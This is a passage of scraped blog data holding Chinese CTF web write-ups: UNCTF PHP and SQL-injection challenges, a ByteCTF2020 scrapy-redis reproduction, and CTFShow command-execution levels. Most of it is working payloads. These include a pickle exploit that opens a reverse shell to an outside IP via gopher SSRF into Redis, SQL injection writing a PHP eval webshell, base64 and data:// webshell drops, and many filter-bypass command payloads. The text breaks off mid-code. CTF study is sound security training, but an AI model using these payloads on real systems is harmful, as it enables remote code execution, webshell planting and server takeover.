1?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D; 第二关 1sha1($verif) == $verif 简单的PHP弱类型绕过，payload 1?verif&#x3D;0e00000000000000000000081614617300000000 https://github.com/spaze/hashes 第三关 123if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;);&#125; 变量名必须是var1或者var12这种形式，而且在变量覆盖环节转义了单双引号。 关于复杂变量的解析：https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/ Payload: 1var1=&#123;$_GET[1]&#125;&amp;var3=$&#123;$var1()&#125;&amp;1=phpinfo 解释： 1$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;; 1$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;; L0vePHP 查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。 解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php index.php 123456789101112&lt;?phperror_reporting(0);$action = $_GET[&#x27;action&#x27;];if (isset($action)) &#123; if (preg_match(&quot;/base|data|input|zip|zlib/i&quot;, $action)) &#123; echo &quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;; &#125; else &#123; include(&quot;$action&quot;); &#125;&#125; else &#123; include(&quot;footer.php&quot;);&#125; flag.php 1234&lt;?php $flag = &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;//hint:316E4433782E706870?&gt; hint用十六进制转码1nD3x.php 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;);$__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125;&#125;foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; 预期解，利用PHP5.6新引入的特性——变长参数 https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html 和Python中的**kwargs，类似，在PHP中可以使用 func(...$arr)这样的方式，将$arr数组展开成多个参数，传入func函数。 payload： 123?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assertPOSTcode&#x3D;usort(...$_GET); 也就是相当于执行了usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert); P年的那篇文章还提到了可以利用文件包含写shell： 1code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents 用脚本自动跑一下： 1234567891011import requestsimport timestrings = &quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;for s in strings: time.sleep(0.5) url = &quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;.format(s) print(url) res = requests.get(url) # print(res.status_code) base64编码后的一句话已经写入了A文件，再文件包含这个A文件。 俄罗斯方块 题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。 拼接一下文件名下载下来解压之后拿到blocks.wasm，再用wabt工具集中的wasm2wat对其进行反编译 https://github.com/WebAssembly/wabt https://webassembly.github.io/wabt/doc/wasm2wat.1.html 反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字 再修改这个分数，最后编译成wasm文件 把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。 ezphp 题目这样出我真的。。。。没想到 并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod： 12345&lt;?php$a = array(&quot;username&quot;=&gt;True,&quot;password&quot;=&gt;True);echo serialize($a);?&gt;// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; POST参数即可得到flag checkin-sql 强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。 堆叠注入查表 1-1&#39;;show tables; 查表字段 1-1&#39;;desc 0xDktb; 用预处理和十六进制编码select * from 0xDktb 11&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql; 发现被过滤掉了set关键字。（在比赛的时候没想到可以直接不要set语句。。。 改为： 11&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql; 发现可以执行成功，那么直接写shellselect '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php' 11&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql; 用蚁剑连接拿flag。 赛后收获 flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过； is_file()函数的参数是一个数组的时候会返回一个NULL； .htaccess可以用换行的方式绕过关键字黑名单 接上一条，如果过滤了\\，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag； PHP复杂变量解析； PHP5.6以后版本有变长参数的特性； 在代码注入的题目中还可以用这种方式写入shell：$_GET[a](N,a,8);&amp;a=file_put_contents，再用PHP伪协议读取； SQL注入预编译过了set，可以直接用prepare execsql from 0x....","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"ByteCTF2020-scrapy_redis复现","date":"2020-11-05T15:30:44.000Z","path":"Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis复现/","text":"ByteCTF2020复现 这web题目出的简直就是神仙。。 easy_scrapy 首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位，可以直接写Python脚本爆破。添加数据的时候，在VPS监听端口： 从上图中可以看出使用的是scrapy+redis，应该是url数据会存储在Redis中，然后用scrapy爬虫爬取。 添加完数据后，在MyUrlList中会显示数据，点击记录，发现会访问http://101.200.50.18:30010/result?url=http://xx.xx.xxx.xx:8888/，可能存在SSRF，监听端口： 后面/result?url则是用了另一种功能进行pycurl的请求，类似于curl，同样支持使用Gopher协议。 复现时候也用SSRF常见利用方式探测端口以及Redis的服务信息，但是没有什么收获。 转变一下思路，既然是爬虫，那么遇到&lt;a&gt;标签，他就有可能去请求： 既然是这样，那么就可以把&lt;a&gt;标签的href改成file协议造成任意文件读取： OK，验证成功。那么这样的话，就可以读取题目的爬虫源码，但是在读之前，需要知道爬虫源码的绝对路径。可以通过读取/etc/self/environ得到工作路径 \u0010 显示当前PWD=/code，但是我们还不知道项目结构，可以去官方文档中找到这个爬虫框架的结构： 12345678910tutorial&#x2F; scrapy.cfg tutorial&#x2F; __init__.py items.py pipelines.py settings.py spiders&#x2F; __init__.py ... 这些文件分别是: scrapy.cfg: 项目的配置文件 tutorial/: 该项目的python模块。之后您将在此加入代码。 tutorial/items.py: 项目中的item文件. tutorial/pipelines.py: 项目中的pipelines文件. tutorial/settings.py: 项目的设置文件. tutorial/spiders/: 放置spider代码的目录. 首先去看项目配置文件： 1234567891011# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html[settings]default &#x3D; bytectf.settings[deploy]#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;project &#x3D; bytectf 得知项目名是bytectf，但是还需要知道bytectf文件夹下的spiders的爬虫文件名。 读取/proc/self/cmdline，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。 1&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte 那么当前的爬虫名字是byte。 读取源码，得到结构如下： 通过piplelines.py和settings.py分别得到了MongoDB和Redis的配置 1234567891011121314151617181920212223242526//pipelines.pyimport pymongoclass BytectfPipeline: def __init__(self): MONGODB_HOST = &#x27;127.0.0.1&#x27; MONGODB_PORT = 27017 MONGODB_DBNAME = &#x27;result&#x27; MONGODB_TABLE = &#x27;result&#x27; MONGODB_USER = &#x27;N0rth3&#x27; MONGODB_PASSWD = &#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27; mongo_client = pymongo.MongoClient(&quot;%s:%d&quot; % (MONGODB_HOST, MONGODB_PORT)) mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME) mongo_db = mongo_client[MONGODB_DBNAME] self.table = mongo_db[MONGODB_TABLE] def process_item(self, item, spider): quote_info = dict(item) print(quote_info) self.table.insert(quote_info) return item 123456789101112131415//settings.pyBOT_NAME = &#x27;bytectf&#x27;SPIDER_MODULES = [&#x27;bytectf.spiders&#x27;]NEWSPIDER_MODULE = &#x27;bytectf.spiders&#x27;RETRY_ENABLED = FalseROBOTSTXT_OBEY = FalseDOWNLOAD_TIMEOUT = 8USER_AGENT = &#x27;scrapy_redis&#x27;SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;REDIS_HOST = &#x27;172.20.0.7&#x27;REDIS_PORT = 6379ITEM_PIPELINES = &#123; &#x27;bytectf.pipelines.BytectfPipeline&#x27;: 300,&#125; 以及主要的爬虫逻辑 1234567891011121314151617181920212223242526272829303132333435import scrapyimport reimport base64from scrapy_redis.spiders import RedisSpiderfrom bytectf.items import BytectfItemclass ByteSpider(RedisSpider): name = &#x27;byte&#x27; def parse(self, response): byte_item = BytectfItem() byte_item[&#x27;byte_start&#x27;] = response.request.url url_list = [] test = response.xpath(&#x27;//a/@href&#x27;).getall() for i in test: if i[0] == &#x27;/&#x27;: url = response.request.url + i else: url = i if re.search(r&#x27;://&#x27;,url): r = scrapy.Request(url,callback=self.parse2,dont_filter=True) r.meta[&#x27;item&#x27;] = byte_item yield r url_list.append(url) if(len(url_list)&gt;3): break byte_item[&#x27;byte_url&#x27;] = response.request.url byte_item[&#x27;byte_text&#x27;] = base64.b64encode((response.text).encode(&#x27;utf-8&#x27;)) yield byte_item def parse2(self,response): item = response.meta[&#x27;item&#x27;] item[&#x27;byte_url&#x27;] = response.request.url item[&#x27;byte_text&#x27;] = base64.b64encode((response.text).encode(&#x27;utf-8&#x27;)) yield item 到这里，我用byc404写好的docker-compose在本地起爬虫，跟线上的bot+redis+mongo环境基本一致。 https://blog.csdn.net/zwq912318834/article/details/78854571 Github上的环境缺一个文件，需要在easyscrapy/python/bytectf/spiders加一个__init__.py文件。不然scrapy会报没有spiders库。 三个containers启动了之后可以看到爬虫服务已经start了。Redis在本机也映射到了6379端口，进入Redis容器可以看到现在没有keys： 在本机上运行fill.py，需要提前安装https://github.com/wuchengwei0122/redis-py.git 相当于向Redis循环200次添加start_urls:http//baidu.com，这个时候就可以看到byte:requests键存在序列化数据： 那么利用链就是想办法写入byte:requests键，内容为序列化数据，而写入的方法就是pycurl的SSRF，利用Gopher协议打Redis。 贴一个官方的exp，用python3生成poc，反弹shell： 由于byte:requests有序列表是zset，需要在Redis上执行ZADD命令。 12345678910111213import pickleimport osfrom urllib.parse import quoteclass exp(object): def __reduce__(self): s = &quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot; return (os.system, (s,))test = str(pickle.dumps(exp()))poc = test.replace(&quot;\\n&quot;,&#x27;\\\\n&#x27;).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)[2:-1]poc =&#x27;gopher://172.20.0.7:6379/_&#x27;+quote(&#x27;ZADD byte:requests 0 &quot;&#x27;)+quote(poc)+quote(&#x27;&quot;&#x27;)print(poc) 用GET打过去的时候需要二次URL编码。 参考文章： https://northity.com/2020/10/30/ByteCTF初赛出题笔记/ http://blog.ccreater.top/2020/10/26/2020ByteCTF/ https://www.jianshu.com/p/0823666a7687 https://blog.csdn.net/zwq912318834/article/details/78854571","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"CTFShow-Web-Writeup","date":"2020-10-29T09:19:26.000Z","path":"Web_security/ctf_writeup/25.CTFShow-Web入门/","text":"CTFShow Web Writeup web入门 命令执行 web29 考点：通配符绕过 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?&gt;&lt;?&#x3D;&#96;cat ????.php&#96;?&gt; web30 考点：通配符绕过 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?&gt;&lt;?&#x3D;&#96;cat ????.???&#96;?&gt; web31 考点：空格、通配符绕过 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; payload： &lt;?=等价于 &lt;?php echo 1?&gt;&lt;?&#x3D;&#96;more%09fla??ph?&#96;?&gt; 有一个奇怪的地方就是这里过滤我试了常见的绕过之后只能用%09 web32 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 这个过滤确实是把👴给🤮到了，过滤了反引号不能直接执行命令，过滤了(不能直接使用函数，一直想另外引用一个GET参数，但是没能成功。 这道题的关键地方在于，PHP中不用括号的函数有echo和include和require，既然过滤了echo，那么就用其他两个。 此外过滤了;可以用?&gt;代替。 默认是没有回显的，可以使用PHP伪协议。 123?c&#x3D;require&quot;$_POST[1]&quot;?&gt;POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php web33 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 这里涉及到一个PHP特性，echo和include和require这三个函数直接后面跟$不会影响PHP语法。 所以直接把上面一道题的双引号去掉即可。 123?c&#x3D;require$_POST[1]?&gt;POST: 1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php web34 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 沿用上一个payload web35 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 继续用上一个payload web36 1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 把上面的payload稍加改造继续用。 web37 12345678910111213&lt;?php//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 由于禁用了flag关键字不能使用php://协议，但是在allow_url_include=On、allow_url_fopen()=On的条件下，可以使用data://协议写webshell。 payload： 1data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D; web38 沿用上一题的payload。 另外还可以包含日志，在UA中写入一句话，然后直接包含日志文件/var/log/nginx/access.log web39 123456789101112&lt;?php//flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1data:text/plain,&lt;?php echo file_put_contents(&quot;test.php&quot;,&quot;&lt;?php system(&#x27;cat f*&#x27;);&quot;);?&gt; web40 考点：无参数函数绕过 12345678910&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 过滤之后还剩所有的字母和!();_|字符，既然括号还在那么就可以使用函数，用无参数函数解决。 1show_source(array_rand(array_flip(scandir(current(localeconv()))))); yu22x师傅提到还可以在特定PHP版本 5.4&lt;php&lt;7.2 的情况下使用session_id()绕过。 目标站点用的PHP7.2+，限制了PHPSESSID的合法字符。 web41 web42 12345678&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; echo($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?c&#x3D;cat flag.php; web43 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload 1?c&#x3D;sort flag.php|| web44 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1c&#x3D;sort%20fla?.php|| web45 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;sort%09fla?.php|| web46 沿用上一题的payload。 web47 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?c&#x3D;nl%09fla?.php|| web48 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 沿用上一题的payload。 web49 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 沿用上一题的payload。 话说为什么%还是可以用。 web50 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?c&#x3D;nl&lt;fl&quot;&quot;ag.php|| web51 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 沿用上一个payload。 web52 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag|| web53 12345678910111213&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php web54 123456789&lt;?phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; Payload: 1?c&#x3D;grep$&#123;IFS&#125;&#39;&#39;$&#123;IFS&#125;????.php **web55 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 这个题还是可以的，思路P神也提到过https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 具体思路还是看P神的讲解，简单来说就是在上传文件的时候，PHP会在/tmp目录下生成一个临时文件，比如/tmp/phpcjggLC，我们可以上传一个bash文件，然后利用Linux通配符和.命令来运行这个脚本文件。 首先构造一个上传页面： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://bb128af7-7ae6-40b9-81f2-f1797563529f.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;Filename：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 然后抓包，更改包的数据： web56 沿用上一题的payload。 **web57 1234567891011&lt;?php// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 来学骚姿势了。 1$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 解释一下： 12345$(()) &#x3D;&#x3D;&gt; 0$((~$(()))) &#x3D;&#x3D;&gt; -1$(($((~$(())))$((~$(()))))) &#x3D;&#x3D;&gt; -2......$((~-37)) &#x3D;&#x3D;&gt; 36 web58&amp;59 蚁剑连接 web60 蚁剑连接 + 插件绕过 web61-70 命令执行+文件包含 **web71 1234567891011121314151617&lt;?phperror_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo 